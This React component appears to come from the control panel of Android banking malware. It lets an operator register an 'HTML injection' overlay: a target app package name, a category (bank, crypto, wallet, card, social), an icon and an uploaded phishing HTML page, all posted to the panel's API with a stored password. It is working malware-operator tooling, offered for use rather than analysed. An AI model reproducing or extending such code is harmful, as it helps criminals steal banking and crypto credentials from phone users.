import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";
import Popup from 'reactjs-popup'
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faBell, faSyringe, faSpinner } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';

import Notification from '../Notification/Notification';


import TextField from '@mui/material/TextField';

export default function AddInjection(props) {

    const [error, setError] = useState(false);

    const { openPopup, setOpenPopup} = props;

    const [InjInfo, setInjInfo] = useState({
        name: "",
        type: "",
        app: "",
        html: "",
        icon: "",
      });
      const [InjImagePreview, setInjImagePreview] = useState(null);
      const [InjHtml, setInjHtml] = useState(null);
      const [openHtmlPopup ,setOpenHtmlPopup] = useState(false);

    const handleInjInfoChange = (event) => {
        setInjInfo({ ...InjInfo, [event.target.name]: event.target.value });
    };

    const validateInput = (inputValue, regex) => {
        if (!regex.test(inputValue)) {
          setError(true);
        } else {
          setError(false);
        }
      };

    const handleImageUpload = (event) => {
    const file = event.target.files[0];
    const reader = new FileReader();

    reader.onload = function(event) {
        InjInfo.icon = event.target.result.split(',')[1];
    };

    if (file) {
        reader.readAsDataURL(file);
    } else {
        setInjImagePreview(defaultImage);
    }

    const file2 = event.target.files[0];
    const reader2 = new FileReader();

    reader2.onload = function(event) {
        setInjImagePreview(reader2.result);
    };

    if (file) {
        reader2.readAsDataURL(file);
    } else {
        setInjImagePreview(defaultImage);
    }
    };

    const handlehtmlupload = (event) => {
        const file = event.target.files[0];
        const reader = new FileReader();
    
        reader.onload = function(event) {
            InjInfo.html = new Buffer(event.target.result).toString('base64');
            setInjHtml(new Buffer(event.target.result).toString('base64'));
        };
    
        if (file) {
            reader.readAsText(file);
        } else {
            InjInfo.html = "";

        }
    };

    function AddInj(app, name, icon, html, cat) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"' + 
                    'request":"addHtmlInjection",' + 
                    '"app":"' + app + '",' + '"name":"' + name + '",' + '"icon":"' + icon + '",' + '"html":"' + html + '",' + '"cat":"' + cat + '",' + 
                    '"password":"' + SettingsContext.password + '"}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
                console.log(result)
                if (result.error){
                    console.log(result.error)
                    toast.error("App already exists!")
                } else {
                    toast.success("Injection for the app " + InjInfo.name + " successfully added")
                }
            } catch (error) {
                console.log(error)
            }
        });
        
    }

    console.log(InjInfo)
    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent sx={{maxWidth: 350}}  dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faSyringe}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Add Injection</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>

                    <TextField name='name' value={InjInfo.name} onChange={handleInjInfoChange} sx={{mt: 3}} id="outlined-basic" label="Name" variant="outlined" fullWidth/>

                    <div>
                    <TextField name='app' error={error} helperText={error ? "Invalid input. Only use lowercase with dots and without spaces. At least one dot." : ""} value={InjInfo.app} onChange={handleInjInfoChange} sx={{mt: 3}}  id="outlined-basic" label="App" variant="outlined" fullWidth/>
                    </div>

                    <div>
                    <InputLabel style={{marginTop: 20}} id="demo-simple-select-helper-label">Type</InputLabel>
                    <Select
                        labelId="demo-simple-select-helper-label"
                        name='type'
                        fullWidth={true}
                        value={InjInfo.type}
                        label="Type"
                        onChange={handleInjInfoChange}
                    >
                        <MenuItem value={"bank"}>Bank</MenuItem>
                        <MenuItem value={"crypto"}>Crypto</MenuItem>
                        <MenuItem value={"wallet"}>Wallet</MenuItem>
                        <MenuItem value={"card"}>Card</MenuItem>
                        <MenuItem value={"social"}>Social</MenuItem>
                    </Select>
                    </div>

                    <Grid mt={2} container spacing={2}>
                        <Grid item xs={6}>
                        {<img src={!InjImagePreview ? "/assets/logos/no_image.png" : InjImagePreview} alt="icon" style={{ 
                        width: '100px', 
                        height: '100px', 
                        borderRadius: '20px', 
                        boxShadow: '0 3px 10px rgba(0, 0, 0, 0.3)',
                        border: '1px solid rgba(0, 0, 0, 0.1)',
                    }} />}
                        </Grid>
                        <Grid item xs={6}>
                        <input
                        accept="image/*"
                        style={{ display: 'none' }}
                        id="button-file"
                        type="file"
                        onChange={handleImageUpload}
                        />
                        <label htmlFor="button-file">
                        <Button style={{ position: 'relative', bottom: '-60px', right: '30px' }} variant="contained" component="span">
                            Upload Icon
                        </Button>
                        </label>
                        </Grid>
                    </Grid>

                    <div style={{marginTop: 30}}>
                        <center><input
                        style={{ display: 'none' }}
                        accept='.html'
                        id="button-html"
                        type="file"
                        onChange={handlehtmlupload}
                        />
                        <label htmlFor="button-html">
                        <Button style={{ position: 'relative'}} variant="contained" component="span">
                            Upload HTML
                        </Button>

                        </label></center>
                    </div>

                    <div style={{ display: 'flex', marginTop: 20,justifyContent: 'flex-end' }}>
                    <Button disabled={error || !(InjInfo.app !== "" && InjInfo.name !== "" && InjInfo.icon !== "" && InjInfo.html !== "" && InjInfo.type !== "")} onClick={() => AddInj(InjInfo.app, InjInfo.name, InjInfo.icon, InjInfo.html, InjInfo.type)} variant="contained">Add</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
}
